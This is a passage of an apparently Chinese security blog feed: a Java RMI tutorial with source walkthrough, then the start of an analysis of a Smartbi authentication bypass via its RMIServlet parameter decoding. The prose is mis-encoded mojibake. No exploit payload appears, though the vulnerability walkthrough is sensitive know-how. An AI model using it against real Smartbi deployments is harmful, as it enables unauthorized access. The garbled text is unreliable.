class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;<br>        <span class="hljs-comment">//UnicastRemoteObject.exportObject(this,0);  //å¦‚æœä¸ç»§æ‰¿UnicastRemoteObjectå°±éœ€è¦æ‰‹åŠ¨å¯¼å‡º</span><br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>(); <span class="hljs-comment">//åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>); <span class="hljs-comment">//åˆ›å»ºæ³¨å†Œä¸­å¿ƒ</span><br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>,remoteObj); <span class="hljs-comment">//ç»‘å®šè¿œç¨‹å¯¹è±¡</span><br>        System.out.println(<span class="hljs-string">&quot;server is OK&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯ä»£ç ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    æ˜¯ä¸æ˜¯æœ‰ç‚¹çœ¼ç†Ÿï¼Œä½ å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼šä¸ºä»€ä¹ˆå®¢æˆ·ç«¯è¿˜è¦åˆ›å»ºä¸€ä¸ªå’ŒæœåŠ¡ç«¯ç›¸åŒçš„æ¥å£ï¼Ÿ</span><br><span class="hljs-comment">    é€šè¿‡å…±äº«æ¥å£å®šä¹‰ï¼ŒRMI æ¡†æ¶èƒ½å¤Ÿåœ¨ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œç¡®ä¿æ–¹æ³•è°ƒç”¨çš„æ­£ç¡®æ€§ã€‚åŒæ—¶ï¼ŒRMI æ¡†æ¶èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä»£ç†å¯¹è±¡å’Œå­˜æ ¹å¯¹è±¡ï¼Œå®ƒä»¬è´Ÿè´£å¤„ç†è¿œç¨‹æ–¹æ³•çš„åºåˆ—åŒ–ã€ç½‘ç»œä¼ è¾“å’Œååºåˆ—åŒ–ç­‰ç»†èŠ‚ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;<br><span class="hljs-comment">//å†™æ³•ä¸€ï¼š</span><br>        <span class="hljs-comment">//è·å–æ³¨å†Œä¸­å¿ƒ</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;192.168.56.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ </span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        <span class="hljs-comment">//è°ƒç”¨è¿œç¨‹æ–¹æ³•</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(out);<br><span class="hljs-comment">//å†™æ³•äºŒï¼š</span><br>        <span class="hljs-comment">//ç›´æ¥æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj1</span> <span class="hljs-operator">=</span> (IRemoteObj) Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1088/remoteObj&quot;</span>);<br>        <span class="hljs-comment">//è°ƒç”¨è¿œç¨‹æ–¹æ³•</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">out1</span> <span class="hljs-operator">=</span> remoteObj1.sayHello(<span class="hljs-string">&quot;hi&quot;</span>);<br>        System.out.println(out1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨æœåŠ¡ç«¯åˆ›å»ºè¿œç¨‹å¯¹è±¡çš„æ—¶å€™â€<code>IRemoteObj remoteObj = new RemoteObjImpl();</code>â€œè¿™ä¸€å¥ä»£ç ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä»–éƒ½å¹²äº†ä»€ä¹ˆ</p><ol><li>å› ä¸ºæˆ‘ä»¬ç»§æ‰¿äº†<code>UnicastRemoteObject()</code>ï¼Œæ‰€ä»¥é¦–å…ˆä¼šæ¥åˆ°ä»–çˆ¶ç±»çš„æ„é€ æ–¹æ³•å¤„å¹¶è¿›è¡Œèµ‹å€¼<code>0</code>ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/ac810643b3fee5dc0b634589aead9868.png" alt="i"></p><ol start="2"><li>éšåä¼šå°†ä¼ å…¥çš„å‚æ•°èµ‹å€¼ç»™<code>port</code>ï¼Œç›¸å½“äºç»™<code>port</code>ä¼ å…¥é»˜è®¤å€¼0ï¼Œå¦‚æœä¼ å…¥0åç»­ä¼šå°†è¿œç¨‹å¯¹è±¡å‘å¸ƒåœ¨éšæœºçš„ç«¯å£ä¸Šã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/a0bf10379a9a2c7243d62ec37bc3dfbc.png" alt="image-20230816183938605"></p><ol start="3"><li>è¿™ä¹Ÿå°±æ˜¯æ˜¯æˆ‘ä»¬ä¹‹å‰ä»£ç ä¸­å¦‚æœç»§æ‰¿äº†è¿™ä¸ªç±»å°±ä¸éœ€è¦å†æ¬¡è°ƒç”¨ï¼Œå¦‚æœä¸ç»§æ‰¿åˆ™éœ€è¦æ‰‹åŠ¨è°ƒç”¨</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/29b6168e6a25f50276a83be349bb112a.png" alt="image-20230816184413215"></p><ol start="4"><li>è·Ÿè¿›<code>UnicastServerRef()</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/14e6eaa1fe4227e4f3042388bcaa4226.png" alt="image-20230816184541021"></p><ol start="5"><li>åœ¨è¿›è¡Œè·Ÿè¿›<code>LiveRef()</code>å› ä¸ºä»–ä¼šè°ƒç”¨ä»–çš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹æ„é€ æ–¹æ³•</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fb7ffb82e926159f612ee86b09fe1375.png" alt="image-20230816184721936"></p><p>ç¬¬ä¸€ä¸ªå‚æ•°å’Œæœ€åä¸€ä¸ªå‚æ•°å¾ˆå¥½ç†è§£ï¼Œä¸­é—´çš„è¿™ä¸ªå‚æ•°æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬è¿˜éœ€è¦å†æ¬¡è·Ÿè¿›</p><ol start="6"><li>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒçš„è¿”å›å€¼æ˜¯<code>TCPEndpoint</code>æ‰€ä»¥å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯å¤„ç†ç½‘ç»œè¯·æ±‚çš„ç±»ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/5d354ed0a490a196835a99760736c99f.png" alt="image-20230816184834796"></p><ol start="7"><li>è·Ÿè¿›å‘ç°ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•°ä¸€ä¸ª<code>host</code>ä¸€ä¸ª<code>port</code>ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/87491f64fb83fabec9a3550f3db294f0.png" alt="image-20230816184951738"></p><ol start="8"><li>ç„¶åæˆ‘ä»¬è·Ÿåˆ°<code>LiveRef</code>å‘ç°ä»–æ°å¥½å°±æ¥æ”¶è¿™ä¸‰ä¸ªå‚æ•°ï¼Œè€Œä¸”ä»ä¸‹æ–¹å‚æ•°ä¿¡æ¯ä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒæ¥æ”¶åˆ°äº†å¯¹åº”çš„å‚æ•°ã€‚åˆ°è¿™ä¸€ç›´æ˜¯å°è£…å°è£…ã€‚è€ŒçœŸæ­£å¤„ç†ç½‘ç»œè¯·æ±‚çš„å°±æ˜¯<code>TCPTransport</code>ï¼Œå¹¶æœ€åå°†çš„ç»“æœæ”¾å…¥<code>LiveRef</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/a7d643ca12ae591e5a2d5ce162bcb082.png" alt="image-20230816185301173"></p><ol start="9"><li>ä¹‹åä¼šåˆ›å»ºä»£ç†ï¼Œç»†å¿ƒçš„åŒå­¦å·²ç»å‘ç°äº†ï¼Œä¸ºä»€ä¹ˆæœåŠ¡ç«¯åˆ›å»ºäº†stubï¼Ÿstubä¸æ˜¯å®¢æˆ·ç«¯çš„ä»£ç†å—ï¼Ÿ</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/40270ac31d21024b22b7533f89cae7cf.png" alt="image-20230816185657657"></p><p>â€‹è§£ç­”ï¼šstubæ˜¯å®¢æˆ·ç«¯çš„ä»£ç†æ²¡é”™ï¼Œä½†æ˜¯å®¢æˆ·ç«¯æ˜¯é€šè¿‡stubæ¥è¿›è¡Œè¿œç¨‹è°ƒç”¨çš„ã€‚ä»–æ•´ä¸ªçš„æµç¨‹æ˜¯å…ˆåœ¨æœåŠ¡ç«¯åˆ›å»ºå¥½stubï¼Œç„¶åæ”¾åœ¨æ³¨å†Œä¸­å¿ƒï¼Œå®¢æˆ·ç«¯åˆ›å»ºstubï¼Œç„¶åå»æ³¨å†Œä¸­å¿ƒæ‰¾å¯¹åº”çš„serverç«¯stubï¼Œæ‰¾åˆ°ä»¥åå†ç”¨serverç«¯çš„stubæ¥æ“ä½œserverç«¯Skeletionã€‚</p><ol start="10"><li>ä¹‹åä¼šåˆ›å»ºä»–çš„ç±»åŠ è½½å™¨ã€æ¥å£ã€è°ƒç”¨å¤„ç†å™¨ï¼Œè€Œè°ƒç”¨å¤„ç†å™¨é‡Œé¢çš„å€¼è¿˜æ˜¯ä¹‹å‰çš„<code>LiveRef</code></li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fe5daee7dd081ca4b65dd0297a57d198.md.png" alt="image-20230816190430758"></p><ol start="11"><li>å¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»æŠŠstubçš„ç«¯å£ä»ä¹‹å‰çš„åˆå§‹å€¼<code>0</code>å˜æˆäº†éšæœºçš„ç«¯å£ï¼Œå‘å¸ƒåœ¨æ³¨å†Œä¸­å¿ƒï¼Œå¹¶è®°å½•serverç«¯ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/fb5c313152ecffdc3d726a96ffbac350.png" alt="image-20230816190840205"></p><p>è¿™é‡Œåªæ˜¯ç®€å•çš„è·Ÿä¸€ä¸‹æœåŠ¡ç«¯åŸåˆ›å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹ï¼Œè®©å¤§å®¶æ¸…æ¥šçš„çœ‹åˆ°ï¼ŒæœåŠ¡ç«¯åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œå®é™…ä¸Šéƒ½å¹²äº†ä»€ä¹ˆã€‚å…·ä½“ç»†èŠ‚æ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†è·Ÿä¸€ä¸‹åˆ›å»ºæ³¨å†Œä¸­å¿ƒ<code>Registry r = LocateRegistry.createRegistry(1099);</code>çœ‹çœ‹ä»–éƒ½å¹²äº†ä»€ä¹ˆ</p><ol><li>åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œæ¥æ”¶å‚æ•°ç«¯å£ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/35ca1e4c504ccb3eb11842cefa3693b9.png" alt="image-20230816191650239"></p><ol start="2"><li>è·Ÿè¿›ï¼Œå‘ç°åº•å±‚åˆ›å»ºäº†<code>LiveRef</code>å’Œ<code>UnicastServerRef</code>ã€‚æœåŠ¡ç«¯åˆ›å»ºåŸåˆ›å¯¹è±¡çš„æ—¶å€™ä¹Ÿæ˜¯è¿™æ ·çš„æ“ä½œã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/990672b5cf8abcf482fd1ef484876b7c.md.png" alt="image-20230816191957806"></p><ol start="3"><li>å”¯ä¸€çš„ä¸åŒæ˜¯ä»–åˆ›å»ºçš„è¿™ä¸ªè¿œç¨‹å¯¹è±¡æ˜¯æ°¸ä¹…çš„è¿œç¨‹å¯¹è±¡ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰è‡ªå®šä¹‰çš„è¿œç¨‹å¯¹è±¡æ˜¯ä¸€ä¸ªä¸´æ—¶çš„å¯¹è±¡ã€‚å¯ä»¥çœ‹åˆ°ï¼Œåé¢è¿˜æ˜¯åœ¨æœåŠ¡ç«¯åˆ›å»ºstubç»™å®¢æˆ·ç«¯æ¥è¿›è¡Œè°ƒç”¨ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/8fa59bb843382c455bc289ea9961bef8.png" alt="image-20230816192249999"></p><ol start="4"><li>å¯ä»¥çœ‹åˆ°æ³¨å†Œä¸­å¿ƒåˆ›å»ºçš„stubä»–æ˜¯ç”±<code>froname</code>åˆ›å»ºçš„ï¼Œä¹‹å‰åˆ›å»ºè¿œç¨‹å¯¹è±¡çš„stubå®é™…ä¸Šæ˜¯é åŠ¨æ€ä»£ç†çš„è°ƒç”¨å¤„ç†å™¨åˆ›å»ºçš„ã€‚ä»–ä»¬ä¸¤ä¸ªçš„åˆ›å»ºæ–¹å¼ä¸ä¸€æ ·ã€‚</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/0a8a68872348aa8a648b486dd8d3fab3.png" alt="image-20230816192630687"></p><ol start="5"><li>ä¹‹åä¼šå°†åˆ›å»ºå¥½çš„è¿œç¨‹å¯¹è±¡æ”¾è¿›<code>table</code>å½“ä¸­</li></ol><p><img src="https://ice.frostsky.com/2023/08/16/13e97abbaaae5931552e813f3869daaf.md.png" alt="image-20230816193458856"></p><p>ç„¶åæœåŠ¡ç«¯æœ€åä¸€æ­¥å°†è¿œç¨‹å¯¹è±¡ç»‘å®šåœ¨æ³¨å†Œä¸­å¿ƒè¿™ä¸€æ­¥æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å°±ä¸è·Ÿäº†ã€‚(ä¸æ˜¯æˆ‘æ‡’ï¼Œæ˜¯ä»Šå¤©å¤©æ°”ä¸å¥½ï¼Œä¸é€‚åˆè°ƒè¯•)</p><p>è‡³æ­¤æˆ‘ä»¬æŠŠæœåŠ¡ç«¯æ•´ä¸ªRMIçš„æµç¨‹ç®€å•åˆ†æäº†ä¸€éï¼Œç°åœ¨å¤§å®¶éƒ½åº”è¯¥æ¸…æ¥šä»–ä»¬æ¯ä¸€æ­¥åˆ°åº•å¹²äº†ä»€ä¹ˆã€‚</p><h1 id="RMIååºåˆ—åŒ–"><a href="#RMIååºåˆ—åŒ–" class="headerlink" title="RMIååºåˆ—åŒ–"></a>RMIååºåˆ—åŒ–</h1><p>ä»RMIè®¾è®¡è§’åº¦æ¥è®²ï¼ŒåŸºæœ¬åˆ†ä¸ºä¸‰å±‚æ¶æ„æ¨¡å¼æ¥å®ç°RMIï¼Œåˆ†åˆ«ä¸º<strong>RMIæœåŠ¡ç«¯</strong>ï¼Œ<strong>RMIå®¢æˆ·ç«¯</strong>å’Œ<strong>RMIæ³¨å†Œä¸­å¿ƒ</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://ice.frostsky.com/2023/08/16/df88fdc4cd57d758745a70045e5a1e02.md.png" alt="image-20230816182716313"></p><p>ä»–ä»¬ä¹‹é—´å¯ä»¥ç›¸äº’ä¸¤ä¸¤é€šä¿¡ã€‚ç”±äºRMIåœ¨ç½‘ç»œä¼ è¾“æ•°æ®æ˜¯éœ€è¦å¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å…¶å®å°±å¯ä»¥åˆ©ç”¨ä»–ååºåˆ—åŒ–ä»è€Œè¿›è¡Œåˆ©ç”¨ã€‚</p><p>è¿™é‡Œå…ˆæä¸€å˜´ï¼Œæˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« åœ¨å‡ºåˆ©ç”¨å§ï¼Œä¸»è¦ä¸æ˜¯æˆ‘æ‡’ï¼Œæ˜¯æˆ‘æ€•æ–‡ç« å¤ªé•¿ï¼Œä½¿å¾—å¤§å®¶é˜…è¯»æ¯ç‡¥æ— å‘³ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbiå†…ç½®ç”¨æˆ·ç»•è¿‡æµ…æ</title>
    <link href="/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/"/>
    <url>/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>â€‹       Smartbiæ˜¯ä¸€æ¬¾å›½å†…é¢†å…ˆçš„å•†ä¸šæ™ºèƒ½å¯è§†åŒ–æŠ¥è¡¨å·¥å…·ï¼Œå®ƒå¯ä»¥å°†æ•°æ®è½¬åŒ–ä¸ºå›¾è¡¨ã€å›¾åƒã€è¡¨æ ¼ç­‰å½¢å¼ï¼Œå¸®åŠ©ä¼ä¸šå¿«é€Ÿå‘ç°æ•°æ®èƒŒåçš„ä»·å€¼ï¼Œä¼˜åŒ–å†³ç­–ï¼Œæé«˜ä¸šåŠ¡æ•ˆç‡ã€‚åœ¨ä¼—å¤šå¯è§†åŒ–æŠ¥è¡¨å·¥å…·ä¸­ï¼ŒSmartbiä»¥é«˜æ•ˆã€æ˜“ç”¨ã€çµæ´»ç­‰ç‰¹ç‚¹è‘—ç§°ã€‚</p><p>â€‹       åœ¨å¯¹ç›®æ ‡ç«™ç‚¹å‘èµ·è¯·æ±‚æ—¶ï¼Œåå°ä¼šåˆ¤æ–­æˆ‘ä»¬çš„è¯·æ±‚è·¯å¾„æ˜¯å¦ä¸ºï¼š<code>&quot;/vision/RMIServlet&quot;</code>ï¼Œå¦‚æœè·¯å¾„æ­£ç¡®æ‰ä¼šæ¥æ”¶å¯¹åº”çš„å‚æ•°ï¼Œè‹¥è·¯å¾„ä¸æ­£ç¡®åˆ™ä¸ä¼šæ¥æ”¶ã€‚</p><p>â€‹       ä»–ä¸€å…±æœ‰<strong>ä¸‰ç§</strong>æ¥æ”¶å‚æ•°çš„æ–¹å¼</p><p>â€‹       <strong>ç¬¬ä¸€ç§</strong>æ˜¯å¦‚ä¸‹å›¾ç”¨<code>windowUnloading</code>çš„æ–¹å¼ä¼ å…¥ï¼Œæ¥æ”¶ä»¥åå…ˆè¿›è¡Œ<code>URLDecode</code>å†ç”¨å†…ç½®çš„<code>RMICoder.decode()</code>è¿›è¡Œè§£ç ï¼Œä¹‹ååˆ†åˆ«èµ‹å€¼ç»™<code>className</code>ã€<code>methodName</code>å’Œ<code>params</code>ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/5e4ad34a2a514cd6344809c2c6cf8f77.png" alt="1"></p><p>â€‹       <strong>ç¬¬äºŒç§</strong>æ¥æ”¶å‚æ•°çš„æ–¹å¼æ˜¯ç›´æ¥ç”¨POSTä¼ å…¥ï¼Œå…ˆæ¥æ”¶<code>className</code>å’Œ<code>methodName</code>ä¸¤ä¸ªå˜é‡ï¼Œæœ€ååœ¨doPostä¸­æ¥æ”¶<code>params</code>ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/5152b017abe11bafdb1029775821fc0f.png" alt="2"></p><p>â€‹       <strong>ç¬¬ä¸‰ç§</strong>æ¥æ”¶å‚æ•°çš„æ–¹å¼æ˜¯ç”¨<code>encode</code>ä¼ å…¥è¿™ç§ä¼ å…¥æ–¹å¼å’Œç¬¬ä¸€ç§çš„<code>windowUnloading</code>æœ‰è®¸å¤šç›¸ä¼¼ä¹‹å¤„ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/c32ef627aabd3ffa43a2dd36a1a6d388.png" alt="3"></p><p>â€‹       çœ‹äº†æ¥æ”¶å‚æ•°çš„æ–¹å¼ä¹‹åï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä»–ä»¬äº§ç”Ÿæ¼æ´çš„åŸå› ã€‚æˆ‘ä»¬ç€é‡è®²è§£ç¬¬ä¸€ç§ä»¥<code>windowUnloading</code>æ–¹å¼ä¼ å…¥ã€‚å› ä¸ºä»–ä»¬åªæ˜¯ä¼ å‚æ–¹å¼ä¸åŒï¼Œåˆ°æœ€ååˆ©ç”¨ç‚¹éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/9c2568fe8547f55d8318d2afc7317cfb.png" alt="img"></p><p>â€‹       é€šè¿‡ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°ç”¨<code>windowUnloading</code>æ¥æ”¶åˆ°å‚æ•°åä¼šå°†<code>content</code>è¿›è¡Œ<code>RMICoder.decode()</code>å…¶å®æœ€é‡è¦çš„ä¹Ÿå°±æ˜¯è¿™ä¸€æ­¥ï¼Œå› ä¸ºè¿™ä¸€æ­¥ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‚æ•°è¿›è¡Œè§£ç ï¼Œé‚£æˆ‘ä»¬è¦ä¼ å…¥å‚æ•°çš„è¯å¿…é¡»å¾—çŸ¥é“ä»–æ˜¯å¦‚ä½•è¿›è¡Œç¼–ç ï¼ˆé¡ºå¸¦æä¸€å˜´ï¼Œ<code>RMICoder.decode()</code>å’Œ<code>RMICoder.encode()</code>æ–¹æ³•æ˜¯ä¸å¯¹ç§°çš„ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç›´æ¥è¿›è¡Œè¿˜åŸï¼‰æ‰€ä»¥æˆ‘ä»¬æ·±å…¥ä¸€ä¸‹<code>RMICoder.decode()</code>ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/bc592e6c68e6d670897d027bd8b3be37.png" alt="img"></p><p>â€‹       å†çœ‹ä¸€ä¸‹<code>CodeHandler.enCode()</code>å’Œ<code>CodeHandler.deCode()</code>ï¼Œé™¤äº†ä¸Šé¢<strong>å­˜</strong>å’Œ<strong>å–</strong>çš„æ–¹å¼ä¸åŒï¼Œæš‚æ—¶è¿˜æ˜¯æ²¡æœ‰æ˜æ˜¾åŒºåˆ«ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/5434c63bcc9232c97370989436277eb0.png" alt="img"></p><p>â€‹       å†å¾€é‡Œé¢è¿›<code>getSystemCoder()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/30a7e8ef0681ec62d46cb1a58e8bf39e.png" alt="img"></p><p>â€‹       è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œç”¨äºè·å–ç³»ç»Ÿç¼–ç å™¨ï¼ˆICoderå¯¹è±¡ï¼‰ã€‚</p><p>â€‹       é¦–å…ˆï¼Œå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡algorithNameï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºnullã€‚</p><p>â€‹       ç„¶åï¼Œåœ¨tryå—ä¸­ï¼Œé€šè¿‡<code>VirtualDatabaseUtil.getSystemConfigValue(&quot;NETWORK_TRANSNISSION_ALGORITHM&quot;)</code>æ–¹æ³•è·å–ç³»ç»Ÿé…ç½®å€¼ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™algorithNameã€‚å¦‚æœåœ¨è·å–é…ç½®å€¼çš„è¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™å°†å¼‚å¸¸è®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œå¹¶å°†algorithNameé‡æ–°èµ‹å€¼ä¸ºnullã€‚</p><p>â€‹       